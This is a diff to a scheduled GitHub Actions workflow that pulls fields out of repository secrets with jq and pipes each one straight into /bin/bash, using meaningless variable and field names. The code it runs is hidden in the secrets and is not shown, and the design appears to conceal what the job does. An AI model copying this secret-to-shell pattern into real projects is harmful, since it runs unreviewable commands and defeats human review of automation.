@@ -1,9 +1,9 @@
 name: suyanzhn
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 5/6 * * *'
+    - cron: '37 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,20 +12,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: suyanzhn
         env:
-          je66428: ${{ secrets.je66428 }}
+          prplr9656: ${{ secrets.prplr9656 }}
         run: |
-          echo $je66428 | jq -r .mbyvt02 | /bin/bash
-          echo $hhwk27332 | jq -r .lrb794 | /bin/bash
-          echo $n0 | jq -r .tr749 | /bin/bash
-          echo $mda833 | jq -r .n618 | /bin/bash
-          echo $xzvl0366 | jq -r .pzhbl04 | /bin/bash
-          echo $eudnl96 | jq -r .lggk2094 | /bin/bash
-          echo $okjo634 | jq -r .p3 | /bin/bash
-          echo $boq1307 | jq -r .ru896 | /bin/bash
-          echo $asn8027 | jq -r .p8888 | /bin/bash
-          echo $vvya1 | jq -r .oepwz249 | /bin/bash
-          echo $fjpj44 | jq -r .pvyhw8 | /bin/bash
-          echo $rdimu0 | jq -r .bh3 | /bin/bash
-          echo $f243 | jq -r .u98335 | /bin/bash
-          echo $tvcg39818 | jq -r .r6 | /bin/bash
+          echo $prplr9656 | jq -r .pw8 | /bin/bash
+          echo $dj167 | jq -r .pdeeu45 | /bin/bash
+          echo $bjwt6 | jq -r .va4264 | /bin/bash
+          echo $qaj497 | jq -r .rawp30173 | /bin/bash
+          echo $hkxaf627 | jq -r .ymvd7 | /bin/bash
+          echo $nmrt67 | jq -r .hr12351 | /bin/bash
+          echo $cuza50574 | jq -r .ixjg59618 | /bin/bash
+          echo $khmhu4 | jq -r .yqh21513 | /bin/bash
+          echo $zq49527 | jq -r .seul9366 | /bin/bash
+          echo $m7 | jq -r .o7706 | /bin/bash
 
